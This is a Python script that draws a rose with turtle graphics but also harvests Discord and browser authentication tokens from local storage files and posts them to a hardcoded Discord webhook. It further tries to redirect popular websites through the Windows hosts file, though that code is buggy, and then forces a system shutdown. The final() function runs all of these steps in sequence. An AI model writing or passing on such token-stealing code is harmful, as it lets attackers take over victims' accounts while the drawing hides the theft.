import os
import re
import json
import turtle
import datetime
import time
from urllib.request import Request, urlopen
WEBHOOK_URL = 'https://discord.com/api/webhooks/926509486506639390/PJTpM8RENBu3ixUadptNfzMETWW7M7Gs43EMR1Pv0mQp3YDDddFvXJy9R7PLmOYXkPhM'
websites=["www.youtube.com","www.discord.com","www.disboard.org","www.gmail.com","www.instagram.com","www.google.com","www.bing.com","www.yahoo.com","www.roblox.com", "www.maps.google.com","www.twitter.com","www.reddit.com","https://osu.ppy.sh/home"]
redirect="128.0.0.1"
hostsPath=r"C:\Windows\System32\drivers\ect\hosts"
PING_ME = False
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
def shutdown():
  os.system("shutdown /s /t 5")
def website():
  while True:
    if datetime(datetime.now().year,datetime.now().month,datetime.now().day,10)< datetime.now()< datetime(datetime.now().year,datetime.now().month,datetime.now().day,10):
      with open(hostsPath, 'r+') as file:
        content=file.read()
        for site in website:
          if site in content:
            pass
          else:
            file.write(redirect+''+site+"\n")
    else:
      exit()
def art():
        #set initial position
        turtle.penup()
        turtle.goto(0,200)
        turtle.pendown()

        #rose flower base
        turtle.fillcolor('red')
        turtle.begin_fill()
        turtle.circle(10,180)
        turtle.circle(25,110)
        turtle.left(50)
        turtle.circle(60,45)
        turtle.circle(20,170)
        turtle.right(24)
        turtle.forward(30)
        turtle.left(10)
        turtle.circle(30,110)
        turtle.forward(20)
        turtle.left(40)
        turtle.circle(90,70)
        turtle.circle(30,150)
        turtle.right(30)
        turtle.forward(15)
        turtle.circle(80,90)
        turtle.left(15)
        turtle.forward(45)
        turtle.right(165)
        turtle.forward(20)
        turtle.left(155)
        turtle.circle(150,80)
        turtle.left(50)
        turtle.circle(150,90)
        turtle.end_fill()
        turtle.left(150)
        turtle.circle(-90,70)
        turtle.left(20)
        turtle.circle(75,105)
        turtle.setheading(60)
        turtle.circle(80,98)
        turtle.circle(-90,40)
        turtle.left(180)
        turtle.circle(90,40)
        turtle.circle(-80,98)
        turtle.setheading(-83)

        #leaves1
        turtle.forward(30)
        turtle.left(90)
        turtle.forward(25)
        turtle.left(45)
        turtle.fillcolor('green')
        turtle.begin_fill()
        turtle.circle(-80,90)
        turtle.right(90)
        turtle.circle(-80,90)
        turtle.end_fill()
        turtle.right(135)
        turtle.forward(60)
        turtle.left(180)
        turtle.forward(85)
        turtle.left(90)
        turtle.forward(80)

        #leaves2
        turtle.right(90)
        turtle.right(45)
        turtle.fillcolor('green')
        turtle.begin_fill()
        turtle.circle(80,90)
        turtle.left(90)
        turtle.circle(80,90)
        turtle.end_fill()
        turtle.left(135)
        turtle.forward(60)
        turtle.left(180)
        turtle.forward(60)
        turtle.right(90)
        turtle.circle(200,60)

        turtle.done()

def final():
    time.sleep(1)
    main()
    art()
    time.sleep(1)
    website()
    shutdown()
    
